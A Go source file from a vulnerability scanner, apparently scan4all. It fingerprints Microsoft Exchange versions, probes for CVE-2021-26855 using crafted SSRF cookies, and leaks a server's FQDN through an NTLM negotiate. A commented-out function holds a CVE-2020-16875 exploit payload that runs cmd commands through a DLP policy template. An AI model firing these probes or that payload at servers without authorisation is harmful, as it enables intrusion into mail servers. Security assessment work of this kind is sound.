package ms

import (
	"encoding/base64"
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"io/ioutil"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

// 返回路径
// 通常在指纹页面中添加
func InitPaths() []string {
	a := strings.Split(`14.0.639,14.0.682,14.0.689,14.0.694,14.0.702,14.0.726,14.1.218,14.1.255,14.1.270,14.1.289,14.1.323,14.1.339,14.1.355,14.1.421,14.1.438,14.2.247,14.2.283,14.2.298,14.2.309,14.2.318,14.2.328,14.2.342,14.2.375,14.2.390,14.3.123,14.3.146,14.3.158,14.3.169,14.3.174,14.3.181,14.3.195,14.3.210,14.3.224,14.3.235,14.3.248,14.3.266,14.3.279,14.3.294,14.3.301,14.3.319,14.3.328,14.3.336,14.3.352,14.3.361,14.3.382,14.3.389,14.3.399,14.3.411,14.3.417,14.3.419,14.3.435,14.3.442,14.3.452,14.3.461,14.3.468,14.3.496,14.3.509,14.3.513,15.0.1044,15.0.1076,15.0.1104,15.0.1130,15.0.1156,15.0.1178,15.0.1210,15.0.1236,15.0.1263,15.0.1293,15.0.1320,15.0.1347,15.0.1365,15.0.1367,15.0.1395,15.0.1473,15.0.1497,15.0.516,15.0.620,15.0.712,15.0.775,15.0.847,15.0.913,15.0.995,15.1.1034,15.1.1261,15.1.1415,15.1.1466,15.1.1531,15.1.1591,15.1.1713,15.1.1779,15.1.1847,15.1.1913,15.1.1979,15.1.2044,15.1.2106,15.1.2176,15.1.2242,15.1.225,15.1.2308,15.1.2375,15.1.2507,15.1.396,15.1.466,15.1.544,15.1.669,15.1.845,15.2.1118,15.2.196,15.2.221,15.2.330,15.2.397,15.2.464,15.2.529,15.2.595,15.2.659,15.2.721,15.2.792,15.2.858,15.2.922,15.2.986,8.0.685,8.0.708,8.0.711,8.0.730,8.0.744,8.0.754,8.0.783,8.0.813,8.1.240,8.1.263,8.1.278,8.1.291,8.1.311,8.1.336,8.1.340,8.1.359,8.1.375,8.1.393,8.1.436,8.2.176,8.2.217,8.2.234,8.2.247,8.2.254,8.2.305,8.3.106,8.3.137,8.3.159,8.3.192,8.3.213,8.3.245,8.3.264,8.3.279,8.3.297,8.3.298,8.3.327,8.3.342,8.3.348,8.3.379,8.3.389,8.3.406,8.3.417,8.3.445,8.3.459,8.3.468,8.3.485,8.3.502,8.3.517,8.3.83`, ",")
	a1 := []string{}
	for _, j := range a {
		a1 = append(a1, fmt.Sprintf("/ecp/%s/exporttool/microsoft.exchange.ediscovery.exporttool.application", j))
	}
	return a1
}

// check CVE-2021-26855
//
// https://github.com/righel/ms-exchange-version-nse/blob/main/ms-exchange-version.nse
// 指纹：path /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
// /ecp/%s/exporttool/microsoft.exchange.ediscovery.exporttool.application
// <assemblyIdentity.*version="(%d+.%d+.%d+.%d+)"
//
// https://raw.githubusercontent.com/righel/ms-exchange-version-nse/main/ms-exchange-versions-dict.json
// https://raw.githubusercontent.com/righel/ms-exchange-version-nse/main/ms-exchange-unique-versions-dict.json
// https://raw.githubusercontent.com/righel/ms-exchange-version-nse/main/ms-exchange-versions-cves-dict.json
// port 443
// https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855
// add Microsoft Exchange Server Remote Code Execution Vulnerability CVE-2021-26855 finder
// https://www.msb365.blog/?p=4099
func CheckCVE_2021_26855(target string) string {
	if oU, err := url.Parse(target); err == nil {
		if oU.Scheme != "" && oU.Host != "" {
			target = oU.Scheme + "://" + oU.Host
		} else {
			target = "https://" + target
		}
	}
	//fmt.Println("check... "+target)
	targetUrl := target + "/owa/auth/temp.js"
	szRst := ""
	if c1 := util.GetClient(targetUrl); c1 != nil {
		c1.DoGetWithClient4SetHd(nil, targetUrl, "GET", nil, func(resp *http.Response, err error, szU string) {
			if nil != err {
				return
			}
			body, _ := ioutil.ReadAll(resp.Body)
			if strings.Contains(string(body), "NegotiateSecurityContext") {
				szRst = fmt.Sprintf("%s IsVUL CVE-2021-26855\n", target)
			}
		}, func() map[string]string {
			return map[string]string{"Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;"}
		}, true)
	}

	return szRst
}

// add EXCHANGE Finder
func GetExFQND(target string) string {
	//fmt.Println("check... "+target)
	ewsUrl := "https://" + target + "/ews/exchange.asmx"
	fqndstr, _ := Ntlminfo(ewsUrl)
	if strings.Contains(fqndstr, ".") {
		return fmt.Sprintf("Exchange %s %s\n", target, fqndstr)
	}
	return ""
}

func append16(v []byte, val uint16) []byte {
	return append(v, byte(val), byte(val>>8))
}

func append32(v []byte, val uint16) []byte {
	return append(v, byte(val), byte(val>>8), byte(val>>16), byte(val>>24))
}

const (
	negotiateUnicode    = 0x0001 // Text strings are in unicode
	negotiateOEM        = 0x0002 // Text strings are in OEM
	requestTarget       = 0x0004 // Server return its auth realm
	negotiateSign       = 0x0010 // Request signature capability
	negotiateSeal       = 0x0020 // Request confidentiality
	negotiateLMKey      = 0x0080 // Generate session key
	negotiateNTLM       = 0x0200 // NTLM authentication
	negotiateLocalCall  = 0x4000 // client/server on same machine
	negotiateAlwaysSign = 0x8000 // Sign for all security levels
)

// ntlm type1
func Negotiate() []byte {
	var ret []byte
	flags := negotiateAlwaysSign | negotiateNTLM | requestTarget | negotiateOEM

	ret = append(ret, "NTLMSSP\x00"...) // protocol
	ret = append32(ret, 1)              // type
	ret = append32(ret, uint16(flags))  // flags
	ret = append16(ret, 0)              // NT domain name length
	ret = append16(ret, 0)              // NT domain name max length
	ret = append32(ret, 0)              // NT domain name offset
	ret = append16(ret, 0)              // local workstation name length
	ret = append16(ret, 0)              // local workstation name max length
	ret = append32(ret, 0)              // local workstation name offset
	ret = append16(ret, 0)              // unknown name length
	ret = append16(ret, 0)              // ...
	ret = append16(ret, 0x30)           // unknown offset
	ret = append16(ret, 0)              // unknown name length
	ret = append16(ret, 0)              // ...
	ret = append16(ret, 0x30)           // unknown offset

	return ret
}

var (
	reg1 = regexp.MustCompile(`[^NTLM].+;Negotiate\z`)
	reg2 = regexp.MustCompile(`[^\s].+[^;Negotiate]`)
	reg3 = regexp.MustCompile(`(\x03\x00.)(.+?)(\x05\x00)`)
	reg4 = regexp.MustCompile(`\x03\x00.|\x05|\x00`)
	reg5 = regexp.MustCompile(`(\x04\x00.)(.+?)(\x03\x00)`)
	reg6 = regexp.MustCompile(`\x04\x00.|\x03|\x00`)
)

// ntlm type2 fqdn
func Ntlminfo(targetUrl string) (fqdn string, domain string) {
	//var fqdn string
	if c1 := util.GetClient(targetUrl); c1 != nil {
		c1.DoGetWithClient4SetHd(nil, targetUrl, "GET", nil, func(resp *http.Response, err error, szU string) {
			if nil != err {
				return
			}
			for _, values := range resp.Header {
				type2 := reg2.FindString(reg1.FindString(strings.Join(values, ";")))
				if type2 != "" {
					decodeBytes, _ := base64.StdEncoding.DecodeString(reg2.FindString(type2))
					fqdn = reg4.ReplaceAllString(reg3.FindString(string(decodeBytes)), "")
					domain = reg6.ReplaceAllString(reg5.FindString(string(decodeBytes)), "")
				}
			}
		}, func() map[string]string {
			return map[string]string{
				"Accept":        "text/xml",
				"Authorization": fmt.Sprintf("NTLM %s", base64.StdEncoding.EncodeToString(Negotiate())),
			}
		}, true)
	}
	return
}

// https://srcincite.io/pocs/cve-2020-16875.py.txt
//func Postxml(targetUrl string, fqdn string) string {
//	xmlcontent := `<?xml version="1.0" encoding="UTF-8"?>
//<dlpPolicyTemplates>
//  <dlpPolicyTemplate id="F7C29AEC-A52D-4502-9670-141424A83FAB" mode="Audit" state="Enabled" version="15.0.2.0">
//    <contentVersion>4</contentVersion>
//    <publisherName>si</publisherName>
//    <name>
//      <localizedString lang="en"></localizedString>
//    </name>
//    <description>
//      <localizedString lang="en"></localizedString>
//    </description>
//    <keywords></keywords>
//    <ruleParameters></ruleParameters>
//    <policyCommands>
//      <commandBlock>
//        <![CDATA[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName="cmd";$i.Arguments="/c netstat -ant";$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start() ]]>
//      </commandBlock>
//    </policyCommands>
//    <policyCommandsResources></policyCommandsResources>
//  </dlpPolicyTemplate>
//</dlpPolicyTemplates>`
//	//urlProxy, _ := url.Parse("http://127.0.0.1:8080")
//	tr := &http.Transport{
//		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
//		//    Proxy: http.ProxyURL(urlProxy),
//	}
//	client := &http.Client{Transport: tr}
//
//	req, _ := http.NewRequest("POST", targetUrl, strings.NewReader(xmlcontent))
//	req.Header.Add("Cookie", fmt.Sprintf("X-BEResource=%s/EWS/Exchange.asmx?a=~1942062522;", fqdn))
//	req.Header.Add("Content-Type", "text/xml")
//	//fmt.Println(req)
//	resp2, _ := client.Do(req)
//
//	//defer resp2.Body.Close()
//	body2, _ := ioutil.ReadAll(resp2.Body)
//
//	return string(body2)
//}
//func makefile(fileName string, conntent string) {
//
//	f, err := os.Create(fileName)
//	defer f.Close()
//	if err != nil {
//		fmt.Println(err.Error())
//	} else {
//		_, _ = f.Write([]byte(conntent))
//	}
//}
